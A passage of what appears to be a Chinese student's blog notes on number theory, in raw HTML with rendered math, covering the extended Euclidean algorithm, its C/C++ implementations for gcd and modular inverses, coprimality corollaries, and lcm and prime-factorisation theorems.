style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mspace"> </span><span class="mord cjk_fallback">利用归纳假设，得到</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">b</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span></span><span class="mspace newline"></span></span></span></p>        </div>      </div>    </div><h3 id="算法设计-1"><a href="#算法设计-1" class="headerlink" title="算法设计"></a>算法设计</h3>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-15d0fc7b" role="button" aria-expanded="false" aria-controls="collapse-15d0fc7b">        <div class="fold-arrow">▶</div>递归算法      </div>      <div class="fold-collapse collapse" id="collapse-15d0fc7b">        <div class="fold-content">          <h4 id="区别与联系"><a href="#区别与联系" class="headerlink" title="区别与联系"></a>区别与联系</h4><blockquote><ul><li><strong>欧几里得算法，即辗转相除法，将求两个较大数的公因数转化为求两个较小数的公因数。</strong></li><li><strong>扩展欧几里得算法，引入了关于s和t的递推关系，在计算r的递推关系求出(a,b)的同时，算出s和t</strong></li><li><strong>扩展欧几里得算法求逆元，是扩展欧几里得算法的主要应用</strong><br>由定理1.9可知，当(m,b)&#x3D;1时,sm+tb&#x3D;(m,b)&#x3D;1，因此，tb&#x3D;1(mod m)<br>于是找到了t，这是b在乘法群中的乘法逆元（第六章）</li></ul></blockquote><h4 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">gcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br><span class="hljs-keyword">if</span>(b == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> a;<br>&#125;<br><span class="hljs-keyword">return</span> gcd(b,a%b);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">exgcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> &amp;x,<span class="hljs-type">int</span> &amp;y)</span><br>&#123;<br><span class="hljs-keyword">if</span>(b == <span class="hljs-number">0</span>)&#123;<br>x = <span class="hljs-number">1</span>;<br>y = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> a;<br>&#125;<br><span class="hljs-type">int</span> d = exgcd(b,a%b,x,y);<br><span class="hljs-type">int</span> z = x;<br>x = y;<br>y = z - a / b * y;<br><span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="扩展欧几里得算法求逆元"><a href="#扩展欧几里得算法求逆元" class="headerlink" title="扩展欧几里得算法求逆元"></a>扩展欧几里得算法求逆元</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">inv</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> x,y;<br><span class="hljs-type">int</span> d = <span class="hljs-built_in">exgcd</span>(a,p,x,y);<br><span class="hljs-keyword">return</span> (x % p + p) % p;<span class="hljs-comment">//保证返回值在[0,p)之间</span><br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div><h2 id="补充定理"><a href="#补充定理" class="headerlink" title="补充定理:"></a>补充定理:</h2><p>这部能够深化对素数和gcd的认识，提出了一些实用的性质。<br>同时又像是贝祖定理的拓展（因为所有证明都离不开贝祖定理）<br>在这对它们进行整理。</p><h3 id="互素的充要条件"><a href="#互素的充要条件" class="headerlink" title="互素的充要条件:"></a>互素的充要条件:</h3><p><img src="/dong.github/images/0916-2.png"></p><h3 id="最大公因数的充要条件"><a href="#最大公因数的充要条件" class="headerlink" title="最大公因数的充要条件"></a>最大公因数的充要条件</h3><p><img src="/dong.github/images/0916-3.png"></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-42f18b29" role="button" aria-expanded="false" aria-controls="collapse-42f18b29">        <div class="fold-arrow">▶</div>证明      </div>      <div class="fold-collapse collapse" id="collapse-42f18b29">        <div class="fold-content">          <p><img src="/dong.github/images/0916-4.png"></p>        </div>      </div>    </div><h3 id="最大公因数的性质"><a href="#最大公因数的性质" class="headerlink" title="最大公因数的性质"></a>最大公因数的性质</h3><p><img src="/dong.github/images/0916-5.png"></p><h3 id="互素的gcd性质"><a href="#互素的gcd性质" class="headerlink" title="互素的gcd性质"></a>互素的gcd性质</h3><p><img src="/dong.github/images/0916-6.png"></p><h4 id="推论1"><a href="#推论1" class="headerlink" title="推论1:"></a>推论1:</h4><p>设a,b,c是三个整数，且c!&#x3D;0，如果c|ab,(a,c)&#x3D;1,则c|b</p><h4 id="推论2"><a href="#推论2" class="headerlink" title="推论2:"></a>推论2:</h4><p>设p是素数, 若p|ab, 则p|a或p|b.</p><h4 id="推论3"><a href="#推论3" class="headerlink" title="推论3:"></a>推论3:</h4><p>设a,b,c是整数，若(a,c)&#x3D;1，(b,c)&#x3D;1，则(ab,c)&#x3D;1</p><h4 id="推论4"><a href="#推论4" class="headerlink" title="推论4:"></a>推论4:</h4><p>设a1,a2,……,an是整数,p是素数,p|a1a2……an，则p|某个a。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>证明方法略，贝祖定理和反证法即可完成所有。<br>这部分也是这节课主要理解难度所在，看起来杂乱繁琐，但是形散而神不散。<br><strong>概括：一个数被拆成乘积形式，素数是其基本组成部分。</strong></p><blockquote><ul><li><strong>发现了吗，这个规律就是下一部分的算术基本定理！！！</strong><br><strong>理解到位，很自然地就过渡到了下一部分，到此为止这章内容的线索也就很明显了。</strong></li></ul></blockquote><h2 id="思考题及其证明"><a href="#思考题及其证明" class="headerlink" title="思考题及其证明"></a>思考题及其证明</h2><p><img src="/dong.github/images/0916-7.png"><br>分类讨论:<br>若c是素数，由推论2，ab必然有一个被c整除。<br>若c非素数，举个反例,12&#x3D;3*4，6|12<br><img src="/dong.github/images/0916-9.png"><br>1.根据gcd性质,公因数一定小于等于最大公因数<br>2.由题:n|(a+b)(a-b),那么由推论1反证即可。<br><img src="/dong.github/images/0916-8.png"><br>1.根据有理数的性质：有理数可以被表示成分数，构造即可。<br>2.由上述互素的gcd性质可以知道:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mtext>  </mtext><mo>⟺</mo><mtext>  </mtext><mo stretchy="false">(</mo><msup><mi>m</mi><mi>k</mi></msup><mo separator="true">,</mo><msup><mi>n</mi><mi>k</mi></msup><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">(m,n)=1 \iff (m^k,n^k)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6684em;vertical-align:-0.024em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟺</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span><br>那么结合最大公因数的性质（图中框出的那条），即可得证。</p><h1 id="重要定理及证明-lcm部分"><a href="#重要定理及证明-lcm部分" class="headerlink" title="重要定理及证明(lcm部分)"></a>重要定理及证明(lcm部分)</h1><p><img src="/dong.github/images/0916-10.png"></p><h2 id="定理1-19"><a href="#定理1-19" class="headerlink" title="定理1.19:"></a>定理1.19:</h2><p>设a,b是两个互素的正整数，则：<br>(1)<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi mathvariant="normal">∣</mi><mi>m</mi><mo separator="true">,</mo><mi>b</mi><mi mathvariant="normal">∣</mi><mi>m</mi><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><mi>a</mi><mi>b</mi><mi mathvariant="normal">∣</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">a|m,b|m \implies ab|m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord">∣</span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mord">∣</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ab</span><span class="mord">∣</span><span class="mord mathnormal">m</span></span></span></span><br>(2)<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo><mo>=</mo><mi>a</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">[a,b]=ab</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">ab</span></span></span></span></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-04f2787c" role="button" aria-expanded="false" aria-controls="collapse-04f2787c">        <div class="fold-arrow">▶</div>证明      </div>      <div class="fold-collapse collapse" id="collapse-04f2787c">        <div class="fold-content">          <p><img src="/dong.github/images/0916-11.png"></p>        </div>      </div>    </div><h2 id="定理1-20"><a href="#定理1-20" class="headerlink" title="定理1.20:"></a>定理1.20:</h2><p>(1)<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi mathvariant="normal">∣</mi><mi>m</mi><mo separator="true">,</mo><mi>b</mi><mi mathvariant="normal">∣</mi><mi>m</mi><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><mo stretchy="false">[</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo><mi mathvariant="normal">∣</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">a|m,b|m \implies [a,b]|m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord">∣</span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mord">∣</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mord">∣</span><span class="mord mathnormal">m</span></span></span></span><br>(2)<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo><mo>=</mo><mi>a</mi><mi>b</mi><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[a,b]=ab/(a,b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ab</span><span class="mord">/</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-1fe6d199" role="button" aria-expanded="false" aria-controls="collapse-1fe6d199">        <div class="fold-arrow">▶</div>证明      </div>      <div class="fold-collapse collapse" id="collapse-1fe6d199">        <div class="fold-content">          <p><img src="/dong.github/images/0916-12.png"></p>        </div>      </div>    </div><h2 id="算术基本定理"><a href="#算术基本定理" class="headerlink" title="算术基本定理:"></a>算术基本定理:</h2><p><img src="/dong.github/images/0916-13.png"></p><h2 id="标准分解式"><a href="#标准分解式" class="headerlink" title="标准分解式:"></a>标准分解式:</h2><p><img src="/dong.github/images/0916-14.png"></p><h2 id="标准分解式的应用"><a href="#标准分解式的应用" class="headerlink" title="标准分解式的应用:"></a>标准分解式的应用:</h2><h3 id="判断整除"><a href="#判断整除" class="headerlink" title="判断整除"></a>判断整除</h3><p><img src="/dong.github/images/0916-15.png"></p><h3 id="求因数个数"><a href="#求因数个数" class="headerlink" title="求因数个数"></a>求因数个数</h3><p><img src="/dong.github/images/0916-16.png"></p><h3 id="求gcd和lcm"><a href="#求gcd和lcm" class="headerlink" title="求gcd和lcm"></a>求gcd和lcm</h3><p><img src="/dong.github/images/0916-17.png"></p><h1 id="综合应用与总结"><a href="#综合应用与总结" class="headerlink" title="综合应用与总结:"></a>综合应用与总结:</h1><p>找了半天一年前的博客笔记，但是再也找不到了，有一些失落。<br>但还记得，那是梦开始的地方，如今时隔一年了，问题终于有了答案。<br>翻到了当时讨论出的AC代码：</p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-72a1265a" role="button" aria-expanded="false" aria-controls="collapse-72a1265a">        <div class="fold-arrow">▶</div>已知gcd、lcm，求a和b      </div>      <div class="fold-collapse collapse" id="collapse-72a1265a">        <div class="fold-content">          <figure class="highlight c"><table><tr><td 